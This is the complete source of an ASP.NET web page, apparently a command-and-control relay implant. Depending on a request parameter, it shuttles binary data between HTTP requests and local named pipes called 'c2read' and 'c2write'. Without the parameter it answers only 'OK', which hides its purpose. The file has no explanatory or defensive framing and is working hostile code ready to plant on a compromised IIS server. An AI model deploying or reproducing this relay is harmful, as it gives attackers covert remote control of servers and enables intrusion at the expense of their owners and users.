<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Pipes" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script language="c#" runat="server">

    void Page_Load(object sender, EventArgs e)
    {

		string mode = Request["mode"];
        if (mode != null)
        {
            if (mode == "read")
            {
                ReadPipe("c2read");
            }
            else if (mode == "write")
            {
                WritePipe("c2write");
            }
        }
        else
        {
            Response.Write("OK");

        }

    }

    void ReadPipe(string pipeName)
    {
        byte[] buffer;

        using (NamedPipeClientStream pipeStream = new NamedPipeClientStream(".",pipeName,PipeDirection.In))
        {
            pipeStream.Connect();

            using (BinaryReader binaryReader = new BinaryReader(pipeStream))
            {
                var bytesSize =  binaryReader.ReadBytes(4);
                var bufferSize = BitConverter.ToInt32(bytesSize,0);
                buffer = binaryReader.ReadBytes(bufferSize);
                Console.WriteLine();
            }

        }
        Response.BinaryWrite(buffer);
    }

    void WritePipe(string pipeName)
    {
        byte[] data = Request.BinaryRead(Request.ContentLength);
        using (NamedPipeClientStream pipeStream = new NamedPipeClientStream(".",pipeName,PipeDirection.Out))
        {
            pipeStream.Connect();

            using (BinaryWriter binaryWriter = new BinaryWriter(pipeStream))
            {
                binaryWriter.Write(data);
            }
        }
    }
</script>
